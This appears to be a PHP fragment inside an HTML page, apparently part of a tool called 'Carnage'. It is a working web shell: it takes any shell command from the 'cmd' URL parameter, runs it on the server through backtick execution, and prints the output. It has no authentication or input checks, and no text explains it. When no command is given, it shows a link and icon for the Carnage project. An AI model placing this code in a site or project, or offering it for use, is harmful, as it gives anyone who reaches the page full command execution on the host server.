<!--Php code start here -->      
        <?php

if (isset($_GET['cmd'])) {
	$command = $_GET['cmd'];
	$output =  `$command`;
	echo "<h3 id='output--'>Output :-</h3>
 		 <pre>".$output."</pre>";
}
else {
	echo '<p><a href="https://7ragnarok7.github.io/Carnage"><img src="./Carnage _ A Network Automation tool focused on Cybersecurity_files/carnage.png" alt="Carnage-icon"></a></p>';
}
?> 

<!--Php code end here --> 
